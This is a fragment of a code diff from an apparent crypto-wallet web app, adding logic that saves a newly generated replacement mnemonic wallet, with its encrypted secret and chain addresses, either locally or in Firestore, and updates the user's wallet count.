+        ownerUid: user.uid,
+        ownerEmail: user.email,
+        ownerDisplayName: user.displayName,
+        wallet: replacementWalletAccount,
+      }).catch(() => {});
+
+      if (isLocalOnlyUser) {
+        const currentScoped = loadWalletsForOwnerScope(user.uid);
+        saveWalletsForOwnerScope(user.uid, [replacementWalletAccount, ...currentScoped]);
+      } else {
+        const newWalletPayload: Record<string, unknown> = {
+          id: replacementWalletId,
+          ownerUid: safeUid,
+          name: replacementWalletName,
+          walletType: 'mnemonic',
+          wordCount: 12,
+          preset: 'standard',
+          accountIndex: 0,
+          encryptedSecret,
+          archived: false,
+          createdAt: serverTimestamp(),
+          updatedAt: serverTimestamp(),
+        };
+        if (derived.addresses.evmAddress) {
+          newWalletPayload.evmAddress = derived.addresses.evmAddress.slice(0, 100);
         }
-      } catch (err) {
-        handleFirestoreError(err, OperationType.WRITE, `users/${safeUid}/wallets/${replacementWalletId}`);
+        if (derived.addresses.solanaAddress) {
+          newWalletPayload.solanaAddress = derived.addresses.solanaAddress.slice(0, 100);
+        }
+        if (derived.addresses.bitcoinAddress) {
+          newWalletPayload.bitcoinAddress = derived.addresses.bitcoinAddress.slice(0, 100);
+        }
+        if (derived.addresses.moneroAddress) {
+          newWalletPayload.moneroAddress = derived.addresses.moneroAddress.slice(0, 120);
+        }
+
+        try {
+          await setDoc(doc(db, 'users', safeUid, 'wallets', replacementWalletId), newWalletPayload);
+          const userSnap = await getDoc(doc(db, 'users', safeUid));
+          if (userSnap.exists()) {
+            const currCount = Number(userSnap.data().walletCount ?? existingWallets.length);
+            await updateDoc(doc(db, 'users', safeUid), {
+              walletCount: Math.min(1000, currCount + 1),
+              updatedAt: serverTimestamp(),
+            });
+          }
+        } catch (err) {
+          handleFirestoreError(err, OperationType.WRITE, `users/${safeUid}/wallets/${replacementWalletId}`);
+        }
       }
 
       generatedMnemonics.push({
